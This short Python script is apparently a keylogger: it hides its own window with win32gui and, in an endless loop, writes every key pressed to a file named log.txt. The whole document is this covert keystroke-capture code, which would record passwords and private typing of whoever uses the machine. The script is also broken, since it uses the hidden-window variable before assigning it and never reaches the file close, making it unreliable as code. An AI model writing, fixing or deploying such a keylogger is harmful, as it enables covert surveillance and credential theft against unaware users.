import keyboard
import win32gui, win32con

win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)


f = open('log.txt', 'w')

while True:
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name
        print(key)
        f.write(key + '\n')

the_program_to_hide = win32gui.GetForegroundWindow()

f.close()



